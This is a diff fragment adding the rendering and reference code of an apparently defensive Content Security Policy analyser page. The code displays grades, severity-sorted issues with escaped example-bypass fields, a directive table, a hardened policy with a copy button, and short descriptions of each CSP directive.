+  const hardened = generateHardenedCSP(directives, issues);
+
+  // Show results, hide placeholder
+  document.getElementById('placeholder').classList.add('hidden');
+  document.getElementById('results').classList.remove('hidden');
+
+  // Grade
+  const gradeLetter = document.getElementById('gradeLetter');
+  gradeLetter.textContent = grade;
+  gradeLetter.style.color = color;
+  document.getElementById('gradeScore').textContent = `Penalty score: ${penalty}`;
+  document.getElementById('gradeDesc').textContent = desc;
+
+  // Counts
+  document.getElementById('countCritical').textContent = counts.critical;
+  document.getElementById('countHigh').textContent = counts.high;
+  document.getElementById('countMedium').textContent = counts.medium;
+  document.getElementById('countLow').textContent = counts.low;
+  document.getElementById('countInfo').textContent = counts.info;
+
+  // Issues list
+  const issuesList = document.getElementById('issuesList');
+  issuesList.innerHTML = '';
+  if (issues.length === 0) {
+    issuesList.innerHTML = '<div style="color:#4ade80;font-size:13px;padding:8px 0;">No issues found — strong CSP!</div>';
+  } else {
+    const sorted = [...issues].sort((a, b) => (SEVERITY_WEIGHT[b.severity] || 0) - (SEVERITY_WEIGHT[a.severity] || 0));
+    for (const issue of sorted) {
+      const div = document.createElement('div');
+      div.className = `issue-item ${issue.severity}`;
+      let bypassHtml = '';
+      if (issue.bypass) {
+        bypassHtml = `<div class="issue-bypass">
+          <div class="issue-bypass-label">Example Bypass Payload</div>
+          <code>${escHtml(issue.bypass)}</code>
+        </div>`;
+      }
+      div.innerHTML = `
+        <div class="issue-header">
+          <span class="severity-badge sev-${issue.severity}">${issue.severity}</span>
+          <span class="issue-title">${escHtml(issue.title)}</span>
+        </div>
+        <div class="issue-desc">${escHtml(issue.description)}</div>
+        ${bypassHtml}
+      `;
+      issuesList.appendChild(div);
+    }
+  }
+
+  // Directive table
+  const tbody = document.getElementById('directiveTableBody');
+  tbody.innerHTML = '';
+  for (const [name, vals] of Object.entries(directives)) {
+    const { dot, label } = getDirectiveStatus(name, vals, issues);
+    const relIssues = issues.filter(i => i.id.toLowerCase().includes(name.replace('-src','').replace('-','')) ||
+      (i.title && i.title.toLowerCase().includes(name)));
+    const notesHtml = relIssues.length > 0
+      ? relIssues.map(i => `<span class="dir-issue-badge sev-${i.severity}" style="font-size:10px;padding:1px 5px;border-radius:3px;background:rgba(0,0,0,.2);border:1px solid currentColor;">${escHtml(i.title.substring(0, 40))}${i.title.length > 40 ? '…' : ''}</span>`).join('<br>')
+      : '<span style="color:#4ade80;font-size:11px;">OK</span>';
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+      <td><span class="dir-name">${escHtml(name)}</span></td>
+      <td><span class="dir-values">${vals.length ? formatValues(vals) : '<span style="color:#475569">none</span>'}</span></td>
+      <td class="dir-status"><span class="status-dot ${dot}"></span><span style="font-size:12px;color:#94a3b8">${label}</span></td>
+      <td class="dir-issues-cell">${notesHtml}</td>
+    `;
+    tbody.appendChild(tr);
+  }
+
+  // Missing important directives note
+  const missingDiv = document.getElementById('directivesMissing');
+  const missing = IMPORTANT_DIRECTIVES.filter(d => !directives[d]);
+  if (missing.length > 0) {
+    missingDiv.innerHTML = '<div style="font-size:12px;color:#64748b;margin-bottom:8px;">Missing directives:</div>' +
+      missing.map(d => `<span class="missing-chip">${escHtml(d)}</span> `).join('');
+  } else {
+    missingDiv.innerHTML = '';
+  }
+
+  // Hardened CSP
+  document.getElementById('hardenedCSP').textContent = hardened;
+}
+
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function copyHardened(btn) {
+  const text = document.getElementById('hardenedCSP').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+/* ============================================================
+   REFERENCE
+   ============================================================ */
+const CSP_REFERENCE = [
+  { name: 'default-src', desc: 'Fallback for all fetch directives not explicitly set. Controls where resources can be loaded from by default.' },
+  { name: 'script-src', desc: 'Controls sources for JavaScript. The most critical directive for XSS prevention.' },
+  { name: 'style-src', desc: 'Controls sources for CSS stylesheets. Unsafe-inline enables UI redressing attacks.' },
+  { name: 'img-src', desc: 'Controls sources for images (including CSS background-image).' },
+  { name: 'font-src', desc: 'Controls sources for web fonts loaded via @font-face.' },
+  { name: 'connect-src', desc: 'Controls URLs for XHR, Fetch, WebSockets, EventSource, and Beacon API.' },
+  { name: 'media-src', desc: 'Controls sources for audio and video elements.' },
+  { name: 'object-src', desc: 'Controls sources for <object>, <embed>, and <applet>. Should be set to none.' },
+  { name: 'frame-src', desc: 'Controls sources for <frame> and <iframe> elements (child frames).' },
+  { name: 'frame-ancestors', desc: 'Controls which origins can embed this page in a frame. Replaces X-Frame-Options.' },
+  { name: 'base-uri', desc: 'Restricts the URLs that can be used in a <base> element. Prevents base tag injection.' },
+  { name: 'form-action', desc: 'Restricts URLs which can be used as action targets for form submission.' },
+  { name: 'worker-src', desc: 'Controls sources for Worker, SharedWorker, or ServiceWorker scripts.' },
+  { name: 'manifest-src', desc: 'Controls sources for Web App Manifest files.' },
+  { name: 'prefetch-src', desc: 'Controls sources for prefetch and prerender requests.' },
+  { name: 'upgrade-insecure-requests', desc: 'Instructs browsers to rewrite HTTP URLs to HTTPS before fetching. Good for sites migrating to HTTPS.' },
+  { name: 'block-all-mixed-content', desc: 'Prevents loading any assets over HTTP when the page uses HTTPS. Stricter than upgrade-insecure-requests.' },
+  { name: 'report-uri', desc: 'Deprecated. Specifies URL to send CSP violation reports. Use report-to instead.' },
+  { name: 'report-to', desc: 'Specifies a reporting group (defined in Reporting-Endpoints header) to receive CSP violation reports.' },
+  { name: 'sandbox', desc: 'Applies sandbox restrictions to associated content, similar to the iframe sandbox attribute.' },
+  { name: 'trusted-types', desc: 'Restricts creation of Trusted Types policies, helping prevent DOM-based XSS.' },
+  { name: 'require-trusted-types-for', desc: 'Enforces that DOM XSS sink inputs must use Trusted Types. Use with script.' },
+];
+
+function buildReference() {
+  const grid = document.getElementById('refGrid');
+  for (const item of CSP_REFERENCE) {
+    const div = document.createElement('div');
+    div.className = 'ref-item';
+    div.innerHTML = `<div class="ref-item-name">${escHtml(item.name)}</div><div class="ref-item-desc">${escHtml(item.desc)}</div>`;
+    grid.appendChild(div);
+  }
+}
+
+function toggleRef() {
+  const btn = document.getElementById('refToggle');
+  const content = document.getElementById('refContent');
+  btn.classList.toggle('open');
+  content.classList.toggle('open');
+}
+
+buildReference();
+</script>
+</body>
+</html>
